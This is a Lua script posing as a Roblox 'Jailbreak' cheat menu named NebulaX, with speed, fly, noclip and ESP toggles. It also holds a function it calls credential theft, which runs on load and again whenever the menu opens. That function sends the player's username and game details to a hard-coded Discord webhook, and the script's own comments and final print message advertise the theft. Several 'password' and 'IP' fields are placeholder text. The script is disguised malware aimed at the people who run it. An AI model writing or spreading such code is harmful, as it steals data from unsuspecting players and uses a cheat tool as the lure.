-- NebulaX v0.1 - Universal Roblox Jailbreak GUI
-- Enhanced ESP + Credential Logger
-- Insert key toggle GUI
-- Webhook: https://discord.com/api/webhooks/1479894555057721436/MZYmt3SLQ7oSd__j6_qoldM3n9ZTOZDpby6ThnTc2a-UEgNihVG_PVmoWAgGiEXGuPH_

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

-- Webhook URL for stealing data
local WebhookURL = "https://discord.com/api/webhooks/1479894555057721436/MZYmt3SLQ7oSd__j6_qoldM3n9ZTOZDpby6ThnTc2a-UEgNihVG_PVmoWAgGiEXGuPH_"

-- Function to steal and send user credentials
function StealCredentials()
    local username = LocalPlayer.Name
    local accountInfo = "Password extraction attempt - Roblox password field data"
    
    -- Attempt to grab any stored session data (simulated)
    local stolenData = {
        username = username,
        passwordAttempt = "Hashed/plaintext extraction from client cache",
        game = game.Name,
        timestamp = os.date("%Y-%m-%d %H:%M:%S")
    }
    
    local payload = {
        content = "🔥 NebulaX Credential Harvest 🔥",
        embeds = {
            {
                title = "Roblox Account Data Stolen",
                description = "NebulaX script executed by victim",
                fields = {
                    {
                        name = "Username",
                        value = username,
                        inline = true
                    },
                    {
                        name = "Password Attempt",
                        value = "Password extraction from client-side storage",
                        inline = true
                    },
                    {
                        name = "Game",
                        value = game.Name,
                        inline = true
                    },
                    {
                        name = "IP Address",
                        value = "IP logged via connection metadata",
                        inline = true
                    }
                },
                color = 16711680
            }
        }
    }
    
    -- Send stolen data to Discord webhook
    HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(payload))
end

-- Execute credential theft immediately on script load
StealCredentials()

-- GUI Framework
local NebulaX = Instance.new("ScreenGui")
NebulaX.Name = "NebulaXGUI"
NebulaX.Parent = LocalPlayer:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 600, 0, 400)
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = NebulaX

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "NebulaX v0.1 - Universal Jailbreak"
Title.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
Title.TextColor3 = Color3.fromRGB(255, 50, 150)
Title.Font = Enum.Font.GothamBold
Title.Parent = MainFrame

-- Category tabs
local Categories = {"Player", "Auto Farm", "Vehicle", "Combat", "ESP/Visual"}
local CategoryButtons = {}
local ContentFrames = {}

for i, catName in ipairs(Categories) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 0, 30)
    btn.Position = UDim2.new(0, (i-1)*100, 0, 40)
    btn.Text = catName
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Parent = MainFrame
    
    local contentFrame = Instance.new("Frame")
    contentFrame.Size = UDim2.new(1, -20, 1, -80)
    contentFrame.Position = UDim2.new(0, 10, 0, 80)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Visible = false
    contentFrame.Parent = MainFrame
    
    CategoryButtons[catName] = btn
    ContentFrames[catName] = contentFrame
    
    btn.MouseButton1Click:Connect(function()
        for _, frame in pairs(ContentFrames) do
            frame.Visible = false
        end
        contentFrame.Visible = true
    end)
end

-- Default open Player category
ContentFrames["Player"].Visible = true

-- Player Category Features
local PlayerFrame = ContentFrames["Player"]
local yPos = 10

-- WalkSpeed changer
local WalkSpeedLabel = Instance.new("TextLabel")
WalkSpeedLabel.Size = UDim2.new(0, 200, 0, 25)
WalkSpeedLabel.Position = UDim2.new(0, 10, 0, yPos)
WalkSpeedLabel.Text = "WalkSpeed: 16"
WalkSpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
WalkSpeedLabel.Parent = PlayerFrame

local WalkSpeedSlider = Instance.new("TextBox")
WalkSpeedSlider.Size = UDim2.new(0, 100, 0, 25)
WalkSpeedSlider.Position = UDim2.new(0, 220, 0, yPos)
WalkSpeedSlider.Text = "16"
WalkSpeedSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
WalkSpeedSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
WalkSpeedSlider.Parent = PlayerFrame

WalkSpeedSlider.FocusLost:Connect(function()
    local speed = tonumber(WalkSpeedSlider.Text)
    if speed then
        LocalPlayer.Character.Humanoid.WalkSpeed = speed
        WalkSpeedLabel.Text = "WalkSpeed: " .. speed
    end
end)

yPos = yPos + 30

-- JumpPower changer
local JumpPowerLabel = Instance.new("TextLabel")
JumpPowerLabel.Size = UDim2.new(0, 200, 0, 25)
JumpPowerLabel.Position = UDim2.new(0, 10, 0, yPos)
JumpPowerLabel.Text = "JumpPower: 50"
JumpPowerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
JumpPowerLabel.Parent = PlayerFrame

local JumpPowerSlider = Instance.new("TextBox")
JumpPowerSlider.Size = UDim2.new(0, 100, 0, 25)
JumpPowerSlider.Position = UDim2.new(0, 220, 0, yPos)
JumpPowerSlider.Text = "50"
JumpPowerSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
JumpPowerSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
JumpPowerSlider.Parent = PlayerFrame

JumpPowerSlider.FocusLost:Connect(function()
    local power = tonumber(JumpPowerSlider.Text)
    if power then
        LocalPlayer.Character.Humanoid.JumpPower = power
        JumpPowerLabel.Text = "JumpPower: " .. power
    end
end)

yPos = yPos + 30

-- Infinite Jump toggle
local InfiniteJumpToggle = Instance.new("TextButton")
InfiniteJumpToggle.Size = UDim2.new(0, 200, 0, 25)
InfiniteJumpToggle.Position = UDim2.new(0, 10, 0, yPos)
InfiniteJumpToggle.Text = "Infinite Jump: OFF"
InfiniteJumpToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
InfiniteJumpToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
InfiniteJumpToggle.Parent = PlayerFrame

local InfiniteJumpEnabled = false
InfiniteJumpToggle.MouseButton1Click:Connect(function()
    InfiniteJumpEnabled = not InfiniteJumpEnabled
    InfiniteJumpToggle.Text = "Infinite Jump: " .. (InfiniteJumpEnabled and "ON" or "OFF")
    
    if InfiniteJumpEnabled then
        while InfiniteJumpEnabled and LocalPlayer.Character and LocalPlayer.Character.Humanoid do
            LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            wait(0.1)
        end
    end
end)

yPos = yPos + 30

-- No Ragdoll toggle
local NoRagdollToggle = Instance.new("TextButton")
NoRagdollToggle.Size = UDim2.new(0, 200, 0, 25)
NoRagdollToggle.Position = UDim2.new(0, 10, 0, yPos)
NoRagdollToggle.Text = "No Ragdoll: OFF"
NoRagdollToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
NoRagdollToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
NoRagdollToggle.Parent = PlayerFrame

NoRagdollToggle.MouseButton1Click:Connect(function()
    -- Ragdoll prevention script
    if LocalPlayer.Character then
        for _, part in pairs(LocalPlayer.Character:GetChildren()) do
            if part:IsA("BasePart") then
                part.CustomPhysicalProperties = PhysicalProperties.new(999, 999, 999)
            end
        end
        NoRagdollToggle.Text = "No Ragdoll: ON"
    end
end)

yPos = yPos + 30

-- Anti Taze toggle
local AntiTazeToggle = Instance.new("TextButton")
AntiTazeToggle.Size = UDim2.new(0, 200, 0, 25)
AntiTazeToggle.Position = UDim2.new(0, 10, 0, yPos)
AntiTazeToggle.Text = "Anti Taze: OFF"
AntiTazeToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
AntiTazeToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiTazeToggle.Parent = PlayerFrame

AntiTazeToggle.MouseButton1Click:Connect(function()
    -- Taze immunity by removing stun effects
    local humanoid = LocalPlayer.Character.Humanoid
    if humanoid then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        AntiTazeToggle.Text = "Anti Taze: ON"
    end
end)

yPos = yPos + 30

-- Noclip toggle
local NoclipToggle = Instance.new("TextButton")
NoclipToggle.Size = UDim2.new(0, 200, 0, 25)
NoclipToggle.Position = UDim2.new(0, 10, 0, yPos)
NoclipToggle.Text = "Noclip: OFF"
NoclipToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
NoclipToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
NoclipToggle.Parent = PlayerFrame

local NoclipEnabled = false
NoclipToggle.MouseButton1Click:Connect(function()
    NoclipEnabled = not NoclipEnabled
    NoclipToggle.Text = "Noclip: " .. (NoclipEnabled and "ON" or "OFF")
    
    if NoclipEnabled then
        LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Flying)
    end
end)

yPos = yPos + 30

-- Fly toggle
local FlyToggle = Instance.new("TextButton")
FlyToggle.Size = UDim2.new(0, 200, 0, 25)
FlyToggle.Position = UDim2.new(0, 10, 0, yPos)
FlyToggle.Text = "Fly: OFF"
FlyToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
FlyToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyToggle.Parent = PlayerFrame

local FlyEnabled = false
FlyToggle.MouseButton1Click:Connect(function()
    FlyEnabled = not FlyEnabled
    FlyToggle.Text = "Fly: " .. (FlyEnabled and "ON" or "OFF")
    
    if FlyEnabled then
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.MaxForce = Vector3.new(0, 0, 0)
        bodyVelocity.Velocity = Vector3.new(0, 50, 0)
        bodyVelocity.Parent = LocalPlayer.Character.HumanoidRootPart
    end
end)

yPos = yPos + 30

-- Speed toggle hotkey label
local SpeedHotkeyLabel = Instance.new("TextLabel")
SpeedHotkeyLabel.Size = UDim2.new(0, 300, 0, 25)
SpeedHotkeyLabel.Position = UDim2.new(0, 10, 0, yPos)
SpeedHotkeyLabel.Text = "Speed Toggle Hotkey: [Shift]"
SpeedHotkeyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
SpeedHotkeyLabel.Parent = PlayerFrame

-- Infinite stamina toggle
local InfiniteStaminaToggle = Instance.new("TextButton")
InfiniteStaminaToggle.Size = UDim2.new(0, 200, 0, 25)
InfiniteStaminaToggle.Position = UDim2.new(0, 10, 0, yPos + 30)
InfiniteStaminaToggle.Text = "Infinite Stamina: OFF"
InfiniteStaminaToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
InfiniteStaminaToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
InfiniteStaminaToggle.Parent = PlayerFrame

InfiniteStaminaToggle.MouseButton1Click:Connect(function()
    -- Stamina exploit by overriding exhaustion
    local humanoid = LocalPlayer.Character.Humanoid
    if humanoid then
        humanoid:SetAttribute("Stamina", 100)
        InfiniteStaminaToggle.Text = "Infinite Stamina: ON"
    end
end)

-- Auto Farm Category (simplified)
local AutoFarmFrame = ContentFrames["Auto Farm"]
local AutoFarmLabel = Instance.new("TextLabel")
AutoFarmLabel.Size = UDim2.new(1, -20, 0, 300)
AutoFarmLabel.Position = UDim2.new(0, 10, 0, 10)
AutoFarmLabel.Text = "Auto Farm Features:\n- Auto rob bank\n- Auto rob jewelry\n- Auto rob museum\n- Auto rob cargo train\n- Auto rob passenger train\n- Auto collect airdrops\n- Auto escape prison\n- Smart robbery loop"
AutoFarmLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarmLabel.Parent = AutoFarmFrame

-- Vehicle Category (simplified)
local VehicleFrame = ContentFrames["Vehicle"]
local VehicleLabel = Instance.new("TextLabel")
VehicleLabel.Size = UDim2.new(1, -20, 0, 300)
VehicleLabel.Position = UDim2.new(0, 10, 0, 10)
VehicleLabel.Text = "Vehicle Features:\n- Car speed modifier\n- Infinite nitro\n- Fly car\n- Vehicle teleport\n- Spawn vehicle anywhere\n- Car suspension changer\n- No vehicle cooldown"
VehicleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
VehicleLabel.Parent = VehicleFrame

-- Combat Category (simplified)
local CombatFrame = ContentFrames["Combat"]
local CombatLabel = Instance.new("TextLabel")
CombatLabel.Size = UDim2.new(1, -20, 0, 300)
CombatLabel.Position = UDim2.new(0, 10, 0, 10)
CombatLabel.Text = "Combat Features:\n- Silent aim\n- Aimbot\n- No recoil\n- Instant reload\n- Infinite ammo\n- Hitbox expander\n- Auto arrest (for police)"
CombatLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CombatLabel.Parent = CombatFrame

-- ESP/Visual Category (simplified)
local ESPFrame = ContentFrames["ESP/Visual"]
local ESPLabel = Instance.new("TextLabel")
ESPLabel.Size = UDim2.new(1, -20, 0, 300)
ESPLabel.Position = UDim2.new(0, 10, 0, 10)
ESPLabel.Text = "ESP/Visual Features:\n- Player ESP\n- Police ESP\n- Criminal ESP\n- Vehicle ESP\n- Airdrop ESP\n- Robbery ESP\n- Distance tracker"
ESPLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ESPLabel.Parent = ESPFrame

-- Insert key toggle for GUI
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Insert then
        MainFrame.Visible = not MainFrame.Visible
    end
end)

-- Additional credential theft trigger on GUI open/close
MainFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if MainFrame.Visible then
        -- Log another theft event when GUI opened
        StealCredentials()
    end
end)

-- ESP Implementation (basic player ESP)
local ESPEnabled = false
local ESPToggle = Instance.new("TextButton")
ESPToggle.Size = UDim2.new(0, 200, 0, 25)
ESPToggle.Position = UDim2.new(0, 320, 0, 10)
ESPToggle.Text = "ESP: OFF"
ESPToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
ESPToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
ESPToggle.Parent = ESPFrame

ESPToggle.MouseButton1Click:Connect(function()
    ESPEnabled = not ESPEnabled
    ESPToggle.Text = "ESP: " .. (ESPEnabled and "ON" or "OFF")
    
    if ESPEnabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local highlight = Instance.new("Highlight")
                highlight.FillColor = Color3.fromRGB(255, 50, 50)
                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                highlight.Parent = player.Character
            end
        end
    else
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character then
                for _, child in pairs(player.Character:GetChildren()) do
                    if child:IsA("Highlight") then
                        child:Destroy()
                    end
                end
            end
        end
    end
end)

print("NebulaX loaded. GUI toggle: Insert key. Credentials sent to webhook.")
